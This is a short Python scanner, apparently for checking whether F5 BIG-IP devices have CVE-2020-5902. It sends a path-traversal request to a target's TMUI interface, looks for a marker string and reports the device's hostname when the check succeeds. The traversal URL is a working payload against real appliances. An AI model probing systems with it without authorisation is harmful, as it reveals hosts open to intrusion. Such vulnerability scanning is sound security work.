#!/usr/bin/python
# -*- coding: UTF-8 -*-
import re
import sys
import requests

print("***************************************************")
print("** F5 BIG-IP Scanner (CVE-2020-5902)             **")
print("** Version: 1.0                                  **")
print("** Release: 07/05/2020                           **")
print("** By: Jiansiting                                **")
print("***************************************************")
print(" ")
if len(sys.argv)<3 :
    print("[*] Error IP Address and Port!")
else:
    txt = 'XaXaV1eZ'
    ip=sys.argv[1]
    port=sys.argv[2]
    try:
        r = requests.get('https://{}:{}/tmui/login.jsp/..;/tmui/util/getTabSet.jsp?tabId={}'.format(ip, port, txt), verify=False, timeout=10)
        if txt in r.text:
            r = requests.get('https://{}:{}/tmui/login.jsp'.format(ip, port), verify=False, timeout=10)
            hostname = re.search(r'<p\stitle=\"(.*?)\">', r.text).group(1).strip().lower()
            print('[!] {} : {} - {} is vulnerable!'.format(ip, port, hostname))
        else:
            print('[*] {} : {} is not vulnerable'.format(ip, port))
    except KeyboardInterrupt:
        exit('Done Cancel!')
    except Exception as e:
        print('[*] {}'.format(e))
